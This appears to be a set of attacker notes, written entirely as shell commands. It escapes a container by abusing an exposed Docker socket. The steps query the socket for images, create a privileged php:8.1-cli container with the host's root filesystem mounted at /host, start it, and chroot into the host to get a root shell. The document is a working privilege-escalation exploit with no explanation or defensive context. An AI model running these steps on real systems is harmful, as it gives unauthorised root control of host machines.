# Get the available images
curl --unix-socket /var/run/docker.sock http://localhost/images/json

# Create new container, use php:8.1-cli as it is an existing image
curl -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{
  "Image": "php:8.1-cli",
  "Cmd": ["/bin/sh"],
  "Tty": true,
  "HostConfig": {
    "Privileged": true,
    "Binds": ["/:/host"]
  }
}' http://localhost/containers/create

# Save id from previous script
# 1eb09c200c4997d44902548fa8cd2ce500083fcbda33ee330f46c0ae8e997b4d
# Create the new container with the previous id
curl -X POST --unix-socket /var/run/docker.sock http://localhost/containers/1eb09c200c4997d44902548fa8cd2ce500083fcbda33ee330f46c0ae8e997b4d/start

# Access the host filesystem
docker exec -it 1eb09c200c4997d44902548fa8cd2ce500083fcbda33ee330f46c0ae8e997b4d chroot /host /bin/bash